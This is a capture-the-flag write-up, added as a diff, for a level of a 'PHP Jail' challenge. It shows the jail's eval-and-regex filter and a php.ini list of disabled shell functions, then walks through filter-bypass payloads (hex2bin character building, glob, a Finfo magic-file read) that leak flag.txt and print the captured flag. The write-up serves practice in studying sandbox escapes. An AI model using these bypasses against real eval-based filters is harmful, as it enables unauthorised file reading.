@@ -1,0 +1,63 @@
+WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
+The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"
+
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
+
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+        if(preg_match('/(\_|\'|\"|`|\.|\$|\/|a|c|s|z|require|include)/i', $var)) {
+                return false;
+        }
+        return true;
+}
+if(filter($var)) {
+        eval($var);
+        echo "Command executed";
+} else {
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+
+---------------------------------------------------------
+
+We now also have the z and the _ character that is restricted
+
+The '_' is rather bothersome since we can't use the __FILE__ variable anymore
+
+We can still get the empty character to use with implde using :
+print(explode(getenv(HOME)[0], getenv(HOME))[0]);
+
+We now need to get the 'a' and '.' characters from somewhere else than __FILE__...
+
+We can get the 'a' character using
+print(hex2bin(61));
+
+When trying to use hex2bin to get the '.' character since the hex code is 2e.
+php doesn't like to have number and character together when not enclosed between quotes...
+
+But we can get a '2e' string using :
+print(hex2bin(3265));
+
+We get the '.' with :
+print(hex2bin(hex2bin(3265)));
+
+We can then reuse a mix of the solution for level 4, replacing __FILE__
+
+This give us flag.txt :
+print(implode(explode(getenv(HOME)[0], getenv(HOME))[0], [fl, hex2bin(61), g, hex2bin(hex2bin(3265)), txt]));
+
+Found a smaller way of getting flag.txt :
+glob(hex2bin(hex2bin(3261)))[0]
+
+But now highlight_file doesn't work anymore since there is an '_'...
+Gotta find an alternative..
+
+Creating a Finfo object with a "magic_path" equal to the file will read the file
+new Finfo(0, glob(hex2bin(hex2bin(3261)))[0]);
+
+It output an error/warning containing the flag :
+FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ
